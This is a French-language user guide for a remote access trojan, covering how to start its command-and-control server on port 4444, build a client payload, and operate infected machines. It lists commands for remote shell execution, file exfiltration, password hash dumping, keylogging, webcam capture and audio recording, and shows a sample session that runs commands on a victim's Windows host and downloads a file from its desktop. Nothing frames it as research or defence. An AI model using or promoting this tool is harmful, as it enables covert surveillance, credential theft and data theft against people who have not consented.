# Guide d'utilisation

## Demarrage du serveur

```bash
cd server/
python main.py
```

Le serveur écoute par défaut sur `0.0.0.0:4444`.

## Generation du client

```bash
cd builder/
python builder.py
```

Saisir :
- IP du serveur (ex: 192.168.1.100)
- Port du serveur (ex: 4444)
- Nom du fichier de sortie

## Commandes serveur

### Menu principal
- `sessions` - Liste les clients connectés
- `interact agent<id>` - Interagir avec un client
- `help` - Aide
- `exit` - Quitter

### Commandes client
- `help` - Liste des commandes
- `ipconfig` - Config réseau
- `screenshot` - Capture d'écran
- `shell <cmd>` - Executer commande
- `download <file>` - Télécharger fichier
- `upload <file>` - Envoyer fichier
- `search <pattern>` - Chercher fichiers
- `hashdump` - Extraire hashes
- `keylogger start/stop` - Keylogger
- `webcam_snapshot` - Photo webcam
- `record_audio <sec>` - Enregistrer audio
- `back` - Retour menu principal

## Exemples

```bash
rat > sessions
[*] Agent 1 - 192.168.1.50:52341 (Windows) - Last seen: 5s ago

rat > interact agent1
[*] Interacting with agent 1
rat agent 1 > screenshot
[+] Screenshot saved as screenshot_1_1627845234.png

rat agent 1 > shell whoami
DESKTOP-ABC123\user

rat agent 1 > download C:\Users\user\Desktop\secret.txt
[+] File downloaded as secret.txt

rat agent 1 > back
rat > exit
```

## Sécurité

- Toutes les communications sont chiffrées
- Les fichiers sont sauvegardés dans `./downloads/`
- Les logs sont dans `./logs/`
- Chaque client a un ID unique

## Dépannage

### Le client ne se connecte pas
- Vérifier IP/port
- Vérifier firewall
- Vérifier que le serveur écoute

### Erreur de dépendances
- Réinstaller avec `poetry install`
- Vérifier Python 3.8+

### Problèmes audio/vidéo
- Installer dépendances système
- Vérifier permissions caméra/micro